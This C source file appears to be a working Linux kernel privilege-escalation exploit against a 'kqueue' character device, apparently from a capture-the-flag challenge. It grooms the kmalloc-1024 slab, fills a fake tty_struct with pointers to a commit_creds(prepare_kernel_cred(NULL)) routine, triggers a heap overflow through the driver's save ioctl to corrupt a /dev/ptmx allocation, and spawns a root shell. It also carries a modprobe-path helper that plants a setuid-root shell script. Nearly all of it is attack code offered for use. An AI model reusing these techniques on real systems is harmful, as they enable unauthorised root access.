#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>

// commands
#define DEV_PATH "/dev/kqueue"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

// utils
#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define ulong unsigned long
#define scu static const unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

static void print_hex8(char* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static void shell_modprobe()
{
    system("echo '#!/bin/sh' > /home/user/hax; echo 'setsid cttyhack setuidgid 0 \
           /bin/sh' >> /home/user/hax");
    system("chmod +x /home/user/hax");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/roooot");
    system("chmod +x /home/user/roooot");
    system("/home/user/roooot");
}

void *(*prepare_kernel_cred)(void *);
int (*commit_creds)(void *);

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

ulong user_cs,user_ss,user_sp,user_rflags;
// should compile with -masm=intel
static void save_state() {
    __asm__("mov %0, cs\n"
            "mov %1, ss\n"
            "pushfq\n"
            "popq %2\n"
            :"=r"(user_cs),"=r"(user_ss),"=r"(user_rflags)
            :
            :"memory"
    );
}

#define CREATE_KQUEUE 0xDEADC0DE
#define EDIT_KQUEUE   0xDAADEEEE
#define DELETE_KQUEUE 0xBADDCAFE
#define SAVE          0xB105BABE

typedef struct{
    uint32_t max_entries;
    uint16_t data_size;
    uint16_t entry_idx;
    uint16_t queue_idx;
    char* data;
}request_t;


typedef struct queue_entry queue_entry;

// sizeof(queue_entry) = 18
struct queue_entry{
    uint16_t idx;
    char *data;
    queue_entry *next;
};

// sizeof(queue) = 24
typedef struct{
    uint16_t data_size;
    uint64_t queue_size; /* This needs to handle larger numbers */
    uint32_t max_entries;
    uint16_t idx;
    char* data;
} queue;

/**
 *  MAX_DATA_SIZE 0x20
 *  MAX_QUEUES    5
 *
 * no limit on max_entries
 *
 * space = sizeof(queue_entry) * max_entries +1
 * queue_size = sizeof(queue) + space
 */
static void create_kqueue(int fd, uint32_t max_entries, uint16_t data_size)
{
    request_t req = {0};
    req.max_entries = max_entries;
    req.data_size = data_size;

    if (ioctl(fd, CREATE_KQUEUE, &req) == -1) {
        perror("create kqueue");
    }
}

static void edit_kqueue(int fd, uint16_t queue_idx, uint16_t entry_idx, char* data)
{
    request_t req = {0};
    req.queue_idx = queue_idx;
    req.entry_idx = entry_idx;
    req.data = data;

    if (ioctl(fd, EDIT_KQUEUE, &req) == -1) {
        perror("edit kqueue");
    }
}

/* not freeing any entries */
static void delete_kqueue(int fd, uint16_t queue_idx) {
    request_t req = {0};
    req.queue_idx = queue_idx;

    if (ioctl(fd, DELETE_KQUEUE, &req) == -1) {
        perror("delete kqueue");
    }
}

static void save_kqueue(int fd, uint16_t queue_idx, uint32_t max_entries, uint16_t data_size)
{
    request_t req = {0};
    req.queue_idx = queue_idx;
    req.data_size = data_size;
    req.max_entries = max_entries;

    if (ioctl(fd, SAVE, &req) == -1) {
        perror("save kqueue");
    }
}

/*
ffffffffc00006ba t err	[kqueue]
ffffffffc0000000 t validate	[kqueue]
ffffffffc0000030 t delete_kqueue	[kqueue]
ffffffffc00000a0 t edit_kqueue	[kqueue]
ffffffffc0000220 t get_order	[kqueue]
ffffffffc0000240 t create_kqueue	[kqueue]
ffffffffc00003d0 t kzalloc	[kqueue]
ffffffffc00003e0 t save_kqueue_entries	[kqueue]
ffffffffc0000590 t kqueue_ioctl	[kqueue]
ffffffffc00006ce t exit_kqueue	[kqueue]
ffffffffc00006ce t cleanup_module	[kqueue]

kqueues = 0xffffffffc0002520

*** Queue ***
addr: 0xffff88801e03c800
data_size: 32
queue_size: 0x3f8
max_entries: 40
queue_idx: 0
queue_data: 0xffff88801e7b9a00

*** Queue ***
addr: 0xffff88801e03c000
data_size: 32
queue_size: 0x3f8
max_entries: 40
queue_idx: 0
queue_data: 0xffff88801e04a620

*** Queue ***
addr: 0xffff88801e03cc00
data_size: 32
queue_size: 0x3f8
max_entries: 40
queue_idx: 18768
queue_data: 0xffff88801e04a100

*/

typedef struct {
    int magic;
    int kref;
    uint64_t* dev;
    uint64_t* driver;
    uint64_t* ops;
} fake_tty_t;

#define PREPARE_KERNEL_CRED 0xffffffff8108c580
#define COMMIT_CREDS 0xffffffff8108c140

void get_root()
{
    commit_creds(prepare_kernel_cred(NULL));
}

int main(void)
{
    int fd = open(DEV_PATH, O_RDONLY);

    if (fd < 0) {
        perror("open");
    }

    prepare_kernel_cred = (uint64_t)PREPARE_KERNEL_CRED;
    commit_creds = (uint64_t)COMMIT_CREDS;

    // kmalloc-1024
    // 32 (queue) + 40 * 24 (queue entry) = 992
    // memory layout:
    //  1 - 0 - 2
    create_kqueue(fd, 40, 0x20); // 0
    create_kqueue(fd, 40, 0x20); // 1
    create_kqueue(fd, 40, 0x20); // 2

    printf("Get root: %p \n", get_root);

    // fill fake tty_ops with get_root fp
    uint64_t fake_tty_ops[0x200];
    for (int i = 0; i < 0x200; i++) {
        fake_tty_ops[i] = (uint64_t)get_root;
    }

    printf("Fake tty ops: %p \n", fake_tty_ops);

    fake_tty_t tty = {0};
    tty.magic = 0x00005401;
    tty.kref = 1;
    tty.dev = fake_tty_ops;
    tty.driver = fake_tty_ops;
    tty.ops = fake_tty_ops;

    for (int i = 0; i < 40; i++) {
        edit_kqueue(fd, 1, i, (uint8_t*)&tty);
    }

    delete_kqueue(fd, 2);

    // allocate tty struct
    // will be allocate in SLAB of kqueue 2 deleted above
    int ptmx = open("/dev/ptmx", O_RDONLY);

    if (ptmx < 0) {
        perror("open");
    }

    // 3072 = offset of kqueue idx 1 to idx 2

    delete_kqueue(fd, 0);
    // save_kqueue allocates a new queue.
    // the new queue is allocated in place
    // of the deleted queue with idx 0.
    // overflow of 0x10 bytes for each saved entry
    save_kqueue(fd, 1, 0x20, 0x30);

    ioctl(ptmx, 0, NULL);

    system("/bin/sh");

    return 0;
}
